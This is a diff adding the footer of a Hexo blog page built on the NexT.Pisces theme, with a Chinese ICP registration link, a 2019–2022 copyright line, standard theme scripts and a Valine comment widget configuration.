+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
